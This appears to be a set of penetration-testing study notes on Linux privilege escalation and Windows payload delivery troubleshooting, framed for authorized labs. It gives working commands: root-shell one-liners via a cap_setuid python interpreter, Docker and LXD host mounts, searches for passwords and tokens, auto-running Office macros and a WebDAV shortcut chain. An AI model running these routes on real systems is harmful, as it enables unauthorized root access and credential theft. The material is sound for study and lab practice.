Find: Prove effective file, directory, ACL and mount control From a real privileged script/binary/configuration path inspect every parent, ACL and effective mount before assuming control. ```bash namei -l /PATH/TO/OBJECT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT findmnt -T /PATH/TO/OBJECT ``` > **Recognize:** Parent replacement can provide a control primitive even when the existing file's write bit is absent. > **Validate next:** Run namei -l, stat and getfacl on the exact path and its parents, then findmnt -T for ro/noexec/nosuid. Check the identity and trigger of the process that uses this path; write permission alone is not execution. [Prove effective file, directory, ACL and mount control](../notes/methods/linux-privesc.md#linux-permissions).
Commands and use-case variants > **Need:** A verified Linux foothold with a known effective UID, groups and filesystem context. Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately ```bash namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS ``` > Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. `nosuid` defeats SUID/SGID and file-capability effects; `noexec` blocks direct execution; `ro` blocks changes. Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under `/etc`, `/opt`, `/usr/local`, application paths and service working directories: ```bash find / -xdev -type f -writable -ls 2>/dev/null find / -xdev -type d -writable -ls 2>/dev/null ``` > **Verify:** Prove the specific read/write/replace action and consumer path; world-writable alone is not the complete escalation chain. > **If it fails:** A read-only/noexec/nosuid mount changes which effects are possible. Find another consumer rather than assuming every permission bypasses mount policy.
Find: Recover credentials from Linux user, service and process trails Follow observed application processes and directories into readable configuration, history and environment; prioritize paths tied to actual services. ```bash ps auxww history find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null ``` > **Recognize:** An actual service's readable configuration supplies an identity-labelled secret candidate. > **Validate next:** Read the named config/history/process artifact and record the user, service and host it belongs to. Classify a recovered password/key, test one matching service context and verify the accepted identity before trying reuse elsewhere. [Recover credentials from Linux user, service and process trails](../notes/methods/linux-privesc.md#linux-secrets).
Commands and use-case variants > **Need:** A verified Linux foothold with a known effective UID, groups and filesystem context. Read access to the artifact; exact account/service context; session/agent access must include a usable live identity ```bash history 2>/dev/null find /home /root -maxdepth 3 -type f \ \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \ -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \ -readable 2>/dev/null grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \ /var/www /opt /srv /etc 2>/dev/null | head -n 200 ``` Inspect process arguments and readable process environment: ```bash ps auxww ps eww -u root 2>/dev/null tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo tr '\0' '\n' < /proc/PID/environ 2>/dev/null ``` Check reusable local sessions/agents only when their sockets are accessible: ```bash w; who; last -n 20 env | grep -E 'SSH_AUTH_SOCK|TMUX|STY' tmux ls 2>/dev/null screen -ls 2>/dev/null find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null ``` > An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking. > **Next:** identify the value's user/service context, validate the smallest relevant transition (`su`, `sudo`, SSH or application authentication), then re-enumerate. Use [credential handling](../reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md) for cracking/reuse. ```bash find /home /var/www /opt /srv -type f \ \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \ -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \ /var/www /opt /srv 2>/dev/null ``` > **Verify:** Record source, exact material type and validated identity/service; keep real secrets in private lab records. > **If it fails:** Stale examples and unrelated tokens are common. A denied process read is a visibility limit, not evidence that no credentials exist elsewhere.
Find: Use an allowed sudo operation to cross a privilege boundary Run the exact sudo policy query from the current user and read run-as identity, executable, arguments and tags. ```bash sudo -n -l 2>&1 sudo -l ``` > **Recognize:** The rule permits that exact program as root; its documented privileged operation becomes a candidate. > **Validate next:** Read sudo -l: match the run-as user, exact executable and allowed arguments. Check NOPASSWD/password access and NOEXEC/environment restrictions; choose only the GTFOBins operation that the full rule permits, then verify id. [Use an allowed sudo operation to cross a privilege boundary](../notes/methods/linux-privesc.md#linux-sudo).
Find: Load a controlled library through a permitted sudo environment Inspect sudo's environment-related tags/defaults and the exact allowed executable's dynamic-linking evidence. ```bash sudo -l file /ALLOWED/PROGRAM readelf -l /ALLOWED/PROGRAM ``` > **Recognize:** Explicit environment permission plus a compatible dynamic consumer suggests a loader-injection candidate. > **Validate next:** Confirm SETENV or explicit LD_PRELOAD preservation in sudo -l and a dynamically linked allowed program. Use only the permitted environment form; inspect the resulting id rather than assuming the shared library ran as root. [Load a controlled library through a permitted sudo environment](../notes/methods/linux-privesc.md#linux-preload).
Find: Use a SUID or SGID program's exposed privileged primitive Inventory privileged-mode files, then focus on custom/nonstandard programs and inspect ownership, mount and documented behavior. ```bash find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null file /PATH/TO/BINARY ``` > **Recognize:** The s bits identify an execution credential mechanism; nonstandard behavior warrants inspection but is not a vulnerability itself. > **Validate next:** Run stat on the flagged executable and findmnt -T on its path. Check the SUID owner, nosuid and exact binary behavior; after a permitted operation run id to see whether the elevated effective UID was retained. [Use a SUID or SGID program's exposed privileged primitive](../notes/methods/linux-privesc.md#linux-suid).
Commands and use-case variants > **Need:** A verified Linux foothold with a known effective UID, groups and filesystem context. Effective SUID/SGID on the relevant mount; a program operation preserves and exposes useful privilege ```bash find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null getcap -r / 2>/dev/null ``` Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate: ```bash namei -l /PATH/TO/BINARY stat /PATH/TO/BINARY file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null strings /PATH/TO/BINARY | head -n 150 dpkg -S /PATH/TO/BINARY 2>/dev/null rpm -qf /PATH/TO/BINARY 2>/dev/null ``` > Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves.
Capability interpretation and example High-value capability candidates include `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_ptrace`, `cap_sys_admin`, `cap_setfcap` and `cap_sys_module`. `cap_net_raw` is usually not a direct root transition. ```bash capsh --print 2>/dev/null grep '^Cap' /proc/self/status ``` Only when the exact interpreter has effective `cap_setuid`: ```bash /PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > `+ep` indicates permitted plus the file effective bit. Bounding sets, namespaces, `nosuid` mounts and program behavior can still change the result.
> **Verify:** Verify effective IDs and the exact privileged operation; a real UID or prompt label alone is insufficient. > **If it fails:** nosuid, privilege dropping, fixed arguments or MAC policy can invalidate a candidate. Distinguish a file-read primitive from arbitrary execution.
Find: Use a file capability that enables a specific privileged operation Search file capabilities and inspect the exact program plus current namespace/bounding context. ```bash getcap -r / 2>/dev/null capsh --print 2>/dev/null ``` > **Recognize:** The specific interpreter has effective set-UID authority, unlike an ordinary copy of python3 elsewhere. > **Validate next:** Read getcap for the exact executable, inspect its mount and match the named capability to the program operation. A version or capability name alone does not prove that the program retains a useful effective capability. [Use a file capability that enables a specific privileged operation](../notes/methods/linux-privesc.md#linux-capabilities).
Find: Control a script, binary or configuration consumed by a privileged job/service Inspect actual cron/systemd definitions and running processes, then follow their action paths into permission checks. ```bash cat /etc/crontab systemctl list-timers --all ps auxww ``` > **Recognize:** The schedule explicitly names a privileged consumer and an exact file to inspect. > **Validate next:** Observe the actual command and UID with pspy or inspect the unit with systemctl cat/show. Run namei -l, stat and getfacl on the consumed path and parents; identify the timer, restart or invocation before changing the file. [Control a script, binary or configuration consumed by a privileged job/service](../notes/methods/linux-privesc.md#linux-jobs).
Commands and use-case variants > **Need:** A verified Linux foothold with a known effective UID, groups and filesystem context. Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger ```bash crontab -l 2>/dev/null cat /etc/crontab cat /etc/anacrontab 2>/dev/null atq 2>/dev/null ls -la /etc/cron.* /var/spool/cron 2>/dev/null grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100 systemctl list-timers --all systemctl list-unit-files --type=service systemctl list-units --type=service --state=running systemctl cat UNIT systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles ``` Observe short-lived commands: ```bash ./pspy64 ./pspy64 -pf -i 1000 ``` Validate every referenced script, binary, configuration, environment file, plugin and parent: ```bash namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null ``` > **Prove:** exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment. Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input. > **Verify:** Verify the consumer's resulting effect and identity; editing a file without an observed trigger is incomplete. > **If it fails:** Wrong path, service sandbox, missing trigger or another effective identity breaks the chain. Use process observation and permission checks.
Find: Hijack an unqualified helper through controlled PATH resolution Inspect a verified privileged helper/script for unqualified executable names and compare its actual PATH with writable directories. ```bash printf '%s\n' "$PATH" namei -l /PATH/TO/CANDIDATE_DIRECTORY strings /PATH/TO/REVIEWED_BINARY ``` > **Recognize:** An unqualified helper can resolve through the controlled earlier directory in the consumer's environment. > **Validate next:** Find the helper name in the privileged script or observed pspy command. Check that it is unqualified and identify the consumer's real PATH; a writable directory matters only if that consumer searches it first. [Hijack an unqualified helper through controlled PATH resolution](../notes/methods/linux-privesc.md#linux-path).
Find: Turn wildcard-expanded filenames into privileged command options Read the exact privileged command line and inspect the directory over which its shell glob expands. ```bash cat /PATH/TO/REVIEWED_JOB_SCRIPT ls -la /PATH/TO/JOB_DIRECTORY namei -l /PATH/TO/JOB_DIRECTORY ``` > **Recognize:** Controlled filenames may become utility arguments after glob expansion; the exact utility and option ordering decide the method. > **Validate next:** Inspect the exact privileged command: confirm that a wildcard expands attacker-controlled names into option positions and that the utility interprets those options. A writable directory without that command/trigger does not enable this route. [Turn wildcard-expanded filenames into privileged command options](../notes/methods/linux-privesc.md#linux-wildcard).
Find: Change a writable account or privilege-policy file Check permissions on the account/policy file identified by enumeration, including parents and mount state, before any content change. ```bash stat /etc/passwd /etc/shadow /etc/sudoers getfacl -p /etc/passwd /etc/sudoers 2>/dev/null ``` > **Recognize:** A sensitive account file appears writable; the authentication implementation and valid record syntax determine its effect. > **Validate next:** Preserve original state; confirm exact effective write, file consumer, useful identity and recovery/trigger. [Change a writable account or privilege-policy file](../notes/methods/linux-privesc.md#linux-policy).
Find: Use privileged group, daemon or container-management control Inspect groups, local sockets and namespace context, then use only permitted read-only daemon inventory to identify rootful/rootless behavior. ```bash id ls -l /var/run/docker.sock cat /proc/1/cgroup ``` > **Recognize:** Effective socket access suggests daemon control; group text alone does not establish host-affecting rootful operations. > **Validate next:** Check API acceptance, rootful/rootless and namespace policy, available resources and the specific host operation. [Use privileged group, daemon or container-management control](../notes/methods/linux-privesc.md#linux-containers).
Commands and use-case variants > **Need:** A verified Linux foothold with a known effective UID, groups and filesystem context. Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation ```bash id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null lxc list 2>/dev/null ``` Group candidates include `docker`, `lxd`/`lxc`, `disk`, `shadow`, `adm`, `systemd-journal` and `libvirt`. Prove the associated resource and effective permission.
Rootful Docker daemon with an available image ```bash docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh ``` > Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.
LXD/LXC with an available image alias ```bash lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh ``` > Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.
> **Verify:** Distinguish host and container namespace, effective UID and the exact host operation. > **If it fails:** Rootless mode, user namespaces, policy or absent images can change the route. Do not equate a container prompt with host compromise.
Find: Exploit a permission-backed mount, NFS mapping or local service Inspect mounts, exports and local listeners after the foothold; correlate each with its identity and reachable service. ```bash findmnt cat /etc/exports 2>/dev/null ss -lntup ``` > **Recognize:** A local-only service or export mapping creates a specific investigation route, not automatic escalation. > **Validate next:** For the service check accepted identity/rights; for NFS check client mapping, write permissions, mount flags and target-side consumer. [Exploit a permission-backed mount, NFS mapping or local service](../notes/methods/linux-privesc.md#linux-mounts).
Find: Control a privileged program's shared-library resolution Inspect the reviewed privileged executable's dependencies/search paths and permission-check the actual selected library directory. ```bash readelf -d /PATH/TO/BINARY namei -l /PATH/TO/LIBRARY_DIRECTORY ``` > **Recognize:** A named dependency plus a potentially controlled search location is a loader-resolution candidate. > **Validate next:** Verify actual runtime selection, ABI/symbols, secure-execution rules, retained privilege and a trigger. [Control a privileged program's shared-library resolution](../notes/methods/linux-privesc.md#linux-library).
Find: Select an evidence-matched Linux software or kernel exploit Collect distribution build/package/architecture and the required local feature before comparing a specific advisory/PoC. ```bash uname -a cat /etc/os-release getconf LONG_BIT ``` > **Recognize:** A version-associated advisory is a candidate; backports and feature state determine applicability. > **Validate next:** Collect uname and the distribution's package/build plus architecture. Match the advisory's vulnerable feature and vendor patch status before choosing a PoC; try a confirmed sudo/file/credential route first when one exists. [Select an evidence-matched Linux software or kernel exploit](../notes/methods/linux-privesc.md#linux-kernel).
Find: Use enumeration tools to generate manually testable candidates Use known manual gaps and the host/runtime context to choose a reviewed enumerator; inspect each highlighted finding against native evidence. ```bash id uname -m command -v bash python3 ls -ld /tmp ``` > **Recognize:** The highlight supplies a candidate object, not the missing privileged consumer or execution trigger. > **Validate next:** Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check. [Use enumeration tools to generate manually testable candidates](../notes/methods/linux-privesc.md#linux-enumerators).
Commands and use-case variants > **Need:** A verified Linux foothold with a known effective UID, groups and filesystem context. Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit: ```bash sh ./linpeas.sh | tee linpeas.txt ``` Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline. ```bash ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt ``` > LinPEAS optional flags vary by build. Read the local `./linpeas.sh -h` before selecting broader checks; they are not the automatic baseline. LSE progresses from default to `-l1`, then `-l2` only if needed. `unix-privesc-check detailed` is slower and more false-positive-prone. For every highlight: ```text exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification ``` Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate. > **Verify:** Read linpeas.txt. Confirm a reported sudo rule with sudo -l, a privileged path with namei/stat/getfacl, or a scheduled consumer with pspy before using that finding > **If it fails:** Script blocked or output empty: check the shell, transfer integrity and output path, then use the native checks for the observed rule/file/job. Empty collector output does not rule out escalation

# Payload Execution Obstacles Cheatsheet [← Cheatsheet index](README.md) | [Full procedure](../reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md) | [Shells and payloads](shells-payloads.md) | [Pivoting](pivoting.md) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Resolve payload execution obstacles](../notes/methods/execution.md) ## State ladder ```text delivery → trigger → parser/loader → execution → connection → handler → session ``` Preserve the last confirmed state. Change only the next failed boundary. | Evidence | Next question | | --- | --- | | File/request arrived | Did the intended consumer open/parse it? | | User/service triggered it | Did a harmless command execute? | | Marker/process exists | Can that context reach the listener? | | TCP connection arrived | Does the handler match the payload? | | Session opened | What host, identity, architecture and privilege? | ## First-pass triage > **Run/context:** artifact generation and listeners belong to the testing workstation; delivery, process execution and security-control evidence must be checked on the selected host. **Decide:** identify the last independently verified state using the [state ladder](#state-ladder). Diagnose the failed boundary before regenerating; a callback problem belongs to [session/route checks](shells-payloads.md#callback-ladder). 1. Prove a harmless direct command. 2. Verify final artifact path and hash. 3. Write every parser/interpreter/loader. 4. Match OS, process bitness, format and dependencies. 5. Check permissions, working directory and explicit policy/control evidence. 6. Verify listener bind and target-to-listener route. 7. Match staged/stageless payload and handler. 8. Repair session I/O last. ## Office macro gates Use `.docm` or legacy `.doc`; `.docx` alone does not persist embedded VBA. Store the macro in the document. Harmless trigger proof: ```vb Sub AutoOpen() RunProof End Sub Sub Document_Open() RunProof End Sub Sub RunProof() CreateObject("WScript.Shell").Run _ "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True End Sub ``` Zone inspection: ```powershell Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream * Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier ``` Check in order: ```text format → macro saved in document → MOTW/zone → Protected View/Trust/GPO → required user action → Office child process → command parsing → network path ``` > Internet-sourced macros are commonly blocked by default. “Enable Content” is not a universal current path. ## Windows Library file chain ```text .Library-ms → Explorer/WebDAV → .lnk → command → optional download → callback ``` WsgiDAV, when already installed: ```bash mkdir -p webdav wsgidav --host=0.0.0.0 --port=80 \ --root=./webdav --auth=anonymous ``` > Port 80 is the plain-HTTP Windows WebDAV baseline. An alternate port needs target-side WebClient and route validation. Minimal library definition: ```xml @windows.storage.dll,-34582 1 true imageres.dll,-1002 {7d49d726-3c21-4f05-99aa-fdc2c9474656} true false http://LHOST/ ``` Controlled shortcut creation: ```powershell $shell = New-Object -ComObject WScript.Shell $shortcut = $shell.CreateShortcut('C:\PATH\webdav\ACTION.lnk') $shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe" $shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt' $shortcut.WorkingDirectory = $env:TEMP $shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11" $shortcut.Save() ``` | Observation | Check next | | --- | --- | | Empty library | WebDAV bind/route/WebClient/policy/serialized state | | No WebDAV request | User action, URL, route or blocked DAV | | Directory visible; no command | Second user action or shortcut control | | Marker exists; no download | Quoting, DNS or delivery-server route | | Download exists; no callback | Format/control/handler/return route | ## Linux compatibility ```bash uname -m file PAYLOAD readelf -h PAYLOAD | sed -n '1,25p' ldd PAYLOAD ls -l PAYLOAD findmnt -T /PATH/TO/PAYLOAD head -n 1 SCRIPT ``` | Error | Likely boundary | | --- | --- | | `Exec format error` | OS/architecture/interpreter format | | `Permission denied` | execute/parent rights, `noexec`, identity or policy | | `No such file` but file exists | dynamic loader or shebang interpreter | | shared object missing | runtime dependency | | `^M` in shebang | CRLF altered interpreter path | | works interactively, not cron/service | environment, cwd, identity, shell or route | ## Windows compatibility ```powershell Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture [Environment]::Is64BitOperatingSystem [Environment]::Is64BitProcess $env:PROCESSOR_ARCHITECTURE Get-AuthenticodeSignature 'C:\PATH\PAYLOAD.exe' ``` Match the consumer: ```text direct process → compatible PE/script/runtime service → service-aware program or expected 1053 behavior DLL → process bitness + exports + dependencies MSI → real MSI package PowerShell → edition/syntax + policy/control state existing PoC → documented space/bad chars/exit behavior ``` ## PowerShell quoting ```powershell $command = 'COMMAND' [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) ``` ```cmd powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE ``` > UTF-16LE Base64 solves a transport/quoting problem. [Use a gated Office macro delivery chain](../notes/methods/execution.md#execution-office).
Find: Use a Windows Library/WebDAV/shortcut chain with explicit interaction Inspect the actual Library XML, remote resource and shortcut properties from the assigned delivery scenario; distinguish browsing from launching. ```powershell Get-Content .\FILE.library-ms Test-NetConnection LHOST -Port PORT ``` > **Recognize:** The resource can be presented while the executable user interaction is still absent. > **Validate next:** Verify compatible WebDAV/Library handling, actual shortcut target/launch, policy and its command effect. [Use a Windows Library/WebDAV/shortcut chain with explicit interaction](../notes/methods/execution.md#execution-library).
Commands and use-case variants > **Need:** A recorded delivery/execution chain with the expected consumer and effect. Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action A `.Library-ms` file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage: ```text delivered .Library-ms → user opens library → Explorer reaches WebDAV location → user opens .lnk → shortcut launches chosen command → optional download/callback ``` If WsgiDAV is already installed, publish a dedicated authorized-lab directory: ```bash mkdir -p webdav wsgidav --host=0.0.0.0 --port=80 \ --root=./webdav --auth=anonymous ``` > Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise. > Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it. Original library template using placeholders: ```xml @windows.storage.dll,-34582 1 true imageres.dll,-1002 {7d49d726-3c21-4f05-99aa-fdc2c9474656} true false http://LHOST/ ``` Save it with a `.Library-ms` extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery. Create a shortcut on a controlled Windows preparation host: ```powershell $shortcutPath = 'C:\PATH\webdav\ACTION.lnk' $shell = New-Object -ComObject WScript.Shell $shortcut = $shell.CreateShortcut($shortcutPath) $shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe" $shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt' $shortcut.WorkingDirectory = $env:TEMP $shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11" $shortcut.Save() ``` Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points: ```text Explorer → WebDAV shortcut command → optional payload/download server executed payload → listener/handler ``` Failure cues: | Observation | Next boundary | | --- | --- | | Library opens empty | WebDAV bind, reachability, WebClient/policy, modified library serialization | | WebDAV receives nothing | Artifact not opened, URL/port wrong, client route or WebDAV blocked | | Directory appears; shortcut never runs | Required second user action absent or shortcut blocked | | Marker works; download absent | Command quoting, DNS and payload-server route | | Download occurs; no execution | Format, permissions, policy, quarantine or dependency | | Execution proven; no callback | Listener, route, payload/handler compatibility | > **Verify:** Verify the launched command's identity/effect and distinguish WebDAV requests from execution. > **If it fails:** Unavailable WebDAV client, blocked remote path, missing shortcut interaction or policy can stop the chain before a callback.
Find: Match an artifact to its executable consumer and runtime Inspect a transferred/generated artifact's bytes, executable format and required consumer/loader before interpreting runtime errors. ```bash file FILE sha256sum FILE readelf -l FILE 2>/dev/null uname -m ``` > **Recognize:** An existing file can fail because its loader/runtime is missing; this is separate from callback failure. > **Validate next:** Verify exact architecture, loader/runtime, permissions, mount policy, line endings and integrity. [Match an artifact to its executable consumer and runtime](../notes/methods/execution.md#execution-format).
Commands and use-case variants > **Need:** A recorded delivery/execution chain with the expected consumer and effect. Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format The file extension is not the execution contract. Record all of these: ```text target OS and build target process architecture artifact format loader/interpreter execution identity and integrity working directory and PATH required runtime/libraries arguments and quoting network direction handler protocol ``` ##### 4.1 Linux checks ```bash uname -a uname -m file PAYLOAD readelf -h PAYLOAD | sed -n '1,25p' ldd PAYLOAD ls -l PAYLOAD findmnt -T /PATH/TO/PAYLOAD head -n 1 SCRIPT ``` Common interpretations: - `Exec format error`: wrong format/architecture or invalid interpreter line; - `Permission denied`: missing execute permission, inaccessible parent directory, `noexec`, policy or identity issue; - `No such file or directory` when the file exists: missing dynamic loader or broken shebang interpreter; - missing shared object: runtime library mismatch; - `^M` in a shebang: CRLF line endings changed the interpreter path; - works interactively but not through cron/service: environment, working directory, shell, identity or route differs. ##### 4.2 Windows checks ```powershell Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture [Environment]::Is64BitOperatingSystem [Environment]::Is64BitProcess $env:PROCESSOR_ARCHITECTURE Get-AuthenticodeSignature -FilePath 'C:\PATH\PAYLOAD.exe' ``` Keep OS architecture and consumer-process architecture separate. A 64-bit OS can run a 32-bit process under WOW64; injected code and DLLs must match the process they enter. A normal executable is not necessarily a service executable, DLL, MSI or script: | Consumer | Required property / common failure | | --- | --- | | Direct process creation | Compatible PE/ELF/script and dependencies | | Windows service | Service-compatible entry/control behavior; error 1053 may follow execution of a non-service program | | DLL loader/hijack | Correct bitness, expected exports and dependency behavior | | `msiexec` | Valid MSI package, not an EXE renamed `.msi` | | PowerShell | Valid syntax, edition/runtime compatibility and applicable policy/control state | | Existing memory-corruption PoC | Documented architecture, space, bad characters and exit behavior | > **Verify:** Verify matching bytes, consumer and actual minimal execution effect; on Windows inspect PE architecture/runtime and resulting process. > **If it fails:** Permission, mount policy, CRLF/shebang, missing runtime and architecture mismatches require different fixes.
Find: Repair quoting, encoding and command-length boundaries Compare the last working simple command with the first added quoting/encoding layer; record which parser receives each representation. ```bash curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH ``` > **Recognize:** The break follows a shell-language/representation change, so network or exploit applicability need not have changed. > **Validate next:** Confirm outer decoding, actual inner shell, length and correct byte/string encoding with a small test. [Repair quoting, encoding and command-length boundaries](../notes/methods/execution.md#execution-parser).
Commands and use-case variants > **Need:** A recorded delivery/execution chain with the expected consumer and effect. Known outer request/template/database parser and inner shell; correct character encoding and transport length Write the real chain: ```text document/shortcut or HTTP/SQL/template input → application parser → VBA/WScript/application runtime → cmd.exe /c, /bin/sh -c or PowerShell → final command/payload ``` Start with a short marker at every layer. Check: - quote ownership at each layer; - expansion of `%VAR%`, `$VAR` and PowerShell variables; - metacharacters such as `&`, `|`, `<`, `>`, `;`, backticks and parentheses; - URL/JSON/XML/Base64 decode count; - command-line, VBA-string, request-field or exploit-buffer length; - current directory and relative paths. PowerShell encoded-command preparation: ```powershell $command = 'COMMAND' $bytes = [Text.Encoding]::Unicode.GetBytes($command) [Convert]::ToBase64String($bytes) ``` ```cmd powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE ``` `-EncodedCommand` uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion. Write the parser chain explicitly: ```text HTTP/SQL/template parser → application language → command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell) → target shell/interpreter → payload command ``` Test each layer with a small command. Encode only for the layer that consumes the characters: ```bash python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))' ``` Typical failures: - `&`, `|`, `>`, `<`, `$`, backticks, quotes or spaces consumed by an outer shell; - URL decoding occurs zero, one or two times; - JSON, XML, SQL or template quoting changes the command; - PowerShell receives UTF-8 Base64 instead of required UTF-16LE; - payload length exceeds a field, command line or exploit buffer; - 32-bit payload is injected into a 64-bit context or the reverse. > **Verify:** Verify received/executed command behavior at each parser boundary with small discriminating tests. > **If it fails:** Truncation, double decoding or mismatched shell syntax should not be treated as missing network connectivity.

[Distinguish PowerShell policy, language mode and protected execution layers](../notes/methods/execution.md#execution-powershell).

Actual host policy/language context and a supported allowed execution route; required runtime features remain available Do not merge these different controls: | Control | What it changes | Useful evidence | | --- | --- | --- | | Execution policy | Conditions for loading/running scripts | `Get-ExecutionPolicy -List` and exact error | | Language mode | Available PowerShell language features | `$ExecutionContext.SessionState.LanguageMode` | | AMSI | Submits supported script/content to antimalware | Explicit block/error plus Defender/PowerShell events | | AppLocker/WDAC | Application/script allow policy | Effective policy and application-control events | | Defender/other AV | File, memory, behavior and network decisions | Status, detection history, quarantine/events | | Permissions | File/process/service/token rights | Access-denied result under named identity | Read-only checks: ```powershell Get-ExecutionPolicy -List $ExecutionContext.SessionState.LanguageMode Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled, BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureVersion Get-MpThreatDetection | Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources Get-AppLockerPolicy -Effective -Xml Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,LevelDisplayName,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message ``` Cmdlets, logs and fields vary by edition, installed modules, permissions and control product. A process-scoped policy setting may change script-loading behavior when GPO does not override it: ```cmd powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1 ``` This does not disable AMSI, application control, antimalware, permissions or network controls. Do not change persistent machine/user policy merely to test a payload. > **Verify:** Record the exact failing layer and demonstrate the chosen permitted operation's actual effect. > **If it fails:** A language-mode error, antimalware block and script policy message require different next decisions.
